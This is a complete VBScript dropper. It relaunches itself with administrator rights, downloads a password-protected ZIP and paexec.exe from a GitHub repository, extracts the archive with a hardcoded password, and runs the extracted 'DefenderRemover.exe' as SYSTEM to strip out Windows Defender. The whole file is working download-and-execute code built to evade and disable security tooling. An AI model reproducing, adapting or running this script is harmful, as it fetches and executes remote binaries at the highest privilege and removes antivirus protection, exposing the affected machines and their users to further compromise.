' VBScript to download and run DefenderRemover.exe as SYSTEM (with passworded ZIP support via 7zr.exe)

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("Shell.Application")
Set wsh = CreateObject("WScript.Shell")

tempDir = wsh.ExpandEnvironmentStrings("%TEMP%") & "\DefenderRemoverSetup"
zipFile = tempDir & "\DefenderRemover.zip"
exeFile = tempDir & "\paexec.exe"
sevenZip = tempDir & "\7zr.exe"
extractDir = tempDir & "\Extracted"
zipPassword = "SSss1234####"

' Ensure folders exist
If Not fso.FolderExists(tempDir) Then fso.CreateFolder(tempDir)
If Not fso.FolderExists(extractDir) Then fso.CreateFolder(extractDir)

' Relaunch as admin if needed
If Not WScript.Arguments.Named.Exists("elevated") Then
    shell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
    WScript.Quit
End If

' Download files
Download "https://github.com/3bd2lra7man/DisableDefenderFM/raw/refs/heads/main/DefenderRemover.zip", zipFile
Download "https://github.com/3bd2lra7man/DisableDefenderFM/raw/refs/heads/main/paexec.exe", exeFile
Download "https://www.7-zip.org/a/7zr.exe", sevenZip

' Extract password-protected ZIP using 7zr
cmd = """" & sevenZip & """ x """ & zipFile & """ -p" & zipPassword & " -o""" & extractDir & """ -y"
wsh.Run "cmd /c " & cmd, 0, True

' Run DefenderRemover.exe as SYSTEM using paexec
defExe = extractDir & "\DefenderRemover.exe"
If fso.FileExists(defExe) Then
    shell.ShellExecute exeFile, "-s """ & defExe & """", "", "open", 1
Else
    MsgBox "DefenderRemover.exe not found after extraction.", vbCritical
End If

' ------------------ FUNCTIONS ------------------

Sub Download(url, savePath)
    Dim http, stream
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.Send

    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1 ' binary
        stream.Open
        stream.Write http.responseBody
        stream.SaveToFile savePath, 2 ' overwrite
        stream.Close
    Else
        MsgBox "Failed to download: " & url & vbCrLf & "Status: " & http.Status, vbCritical
        WScript.Quit
    End If
End Sub
